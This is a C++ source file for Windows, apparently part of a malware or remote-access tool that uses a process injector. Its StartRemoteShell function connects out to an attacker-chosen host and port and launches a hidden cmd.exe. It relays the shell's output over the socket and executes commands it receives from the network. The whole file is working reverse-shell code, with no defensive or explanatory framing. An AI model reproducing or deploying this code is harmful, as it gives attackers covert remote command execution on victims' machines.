#ifndef WIN32_LEAN_AND_MEAN
	#define WIN32_LEAN_AND_MEAN
#endif


#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <iostream>
#include <fstream>
#include <sstream>

#include "Injector.h"

using namespace std;

void StartRemoteShell(const char* rhost_ip, const char* rhost_port)
{
	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, true };
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WSADATA wsa;

	// check version 2.2 is supported
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return;

	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd < 0) return;

	SOCKADDR_IN service;
	service.sin_family = AF_INET;
	service.sin_port = htons(atoi(rhost_port));

	LPHOSTENT host = gethostbyname(rhost_ip);
	if (!host) return;

	service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
	if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0) 
		return;

	// we connected, update connection status
	//isRemoveShellActive = true;

	// create pipes to cmd process
	DWORD tmp = 0;
	if(send(fd, "Lets chat\n", sizeof("Lets chat\n"), 0) == SOCKET_ERROR) goto closeSck;
	if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
		send(fd, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
		goto closeSck;
	}
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = stdoutWr;
	si.hStdError = stdoutWr;
	si.hStdInput = stdinRd;

	if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		send(fd, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
		goto closeSck;
	}

	while(1)
	{
		// make sure (cmd) process is still running
		DWORD exitCode;
		GetExitCodeProcess(pi.hProcess, &exitCode);
		if(exitCode != STILL_ACTIVE)
			break;

		// check that there is stuff in the command line console
		char* buff;
		DWORD content_length;
		PeekNamedPipe(stdoutRd, NULL, 0, NULL, &content_length, NULL);
		if(content_length != 0)
		{
			// read content of cmd, and send it over the net
			buff = new char[content_length];
			ZeroMemory(buff, content_length);
			

			// calcualte how many iterations needed to send 256 byte sized packets for the current content_length
			int send_count = content_length / 256;
			int rem = content_length % 256; // send 255 byte packets (fast)

			if (send_count > 0)
			{
				// send read content in 256 packets
				while (send_count > 0)
				{
					ReadFile(stdoutRd, buff, 256, &tmp, NULL);
					send(fd, buff, 256, 0);
					send_count--;
				}

				// send remainder (if any)
				if (rem > 0)
				{
					ReadFile(stdoutRd, buff, rem, &tmp, NULL);
					send(fd, buff, rem, 0);
				}
			}
			else // content_length is less than 256, send it as it is
			{
				ReadFile(stdoutRd, buff, content_length, &tmp, NULL);
				send(fd, buff, content_length, 0);
			}
		}
		else
			goto closeSck;
        
		// receive remote commands (1024 bytes MAX) and execute them
		delete [] buff;
		buff = new char[1024];
		ZeroMemory(buff, 1024);

		int bytes_received = recv(fd, buff, 1024, 0);

		if (bytes_received <= 0) // connection has been closed, update status and exit
		{
			//isRemoveShellActive = false;
			goto closeSck;
		}

		// append null-character(0) to properly defined the received string/command
		buff[bytes_received+1] = '\0';

		// send received command to cmd.exe process through the pipe
		WriteFile(stdinWr, buff, bytes_received, &tmp, NULL);

		// (avoid memory leak)
		delete [] buff;
   }
   closeSck:
       TerminateProcess(pi.hProcess, 0);
       CloseHandle(stdinRd);
       CloseHandle(stdinWr);
       CloseHandle(stdoutRd);
       CloseHandle(stdoutWr);
       closesocket(fd);
	   WSACleanup();
}